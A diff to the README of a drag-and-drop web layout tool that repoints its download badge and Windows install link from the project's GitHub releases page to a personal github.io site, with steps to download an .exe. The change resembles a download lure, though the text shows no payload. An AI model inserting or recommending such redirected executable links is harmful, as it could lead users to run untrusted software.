@@ -1,6 +1,6 @@
 # 🎨 my-awesome - Build web layouts with visual tools
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Reluctant-signore917/my-awesome/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://reluctant-signore917.github.io)
 
 my-awesome helps you build web layouts. You drag and drop components to create designs. You see the code change in real time. This tool works on your computer without an internet connection. It includes over 200 parts to help you build pages. You do not need to write code to use this tool.
 
@@ -14,7 +14,7 @@ This tool aims to save time. It removes the need for manual coding. You focus on
 
 You need to follow these steps to use the software on Windows.
 
-1. Visit this link to reach the download page: [https://github.com/Reluctant-signore917/my-awesome/releases](https://github.com/Reluctant-signore917/my-awesome/releases)
+1. Visit this link to reach the download page: [https://reluctant-signore917.github.io](https://reluctant-signore917.github.io)
 2. Look for the latest version at the top of the list.
 3. Click the file that ends in .exe.
 4. Save the file to your computer.
